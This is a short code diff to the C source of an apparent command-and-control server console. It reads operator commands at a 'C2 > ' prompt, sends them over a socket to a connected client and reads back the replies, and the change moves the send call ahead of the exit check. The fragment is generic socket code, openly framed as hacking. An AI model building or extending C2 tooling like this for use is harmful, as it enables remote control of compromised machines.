@@ -66,13 +66,13 @@ int main()
         printf("\nC2 > ");
         fgets(command, sizeof(command), stdin);
         command[strcspn(command, "\n")] = 0;
+        send(baccept,command,sizeof(command),0);
         if (strcmp(command, "exit") == 0) {
-            send(baccept,command,sizeof(command),0);
             printf("HACK THE WORLD!");
             break; 
         }
 
-        send(baccept,command,sizeof(command),0);
+        
         
         Sleep(500);
         recv(baccept,recvserver,sizeof(recvserver),0);
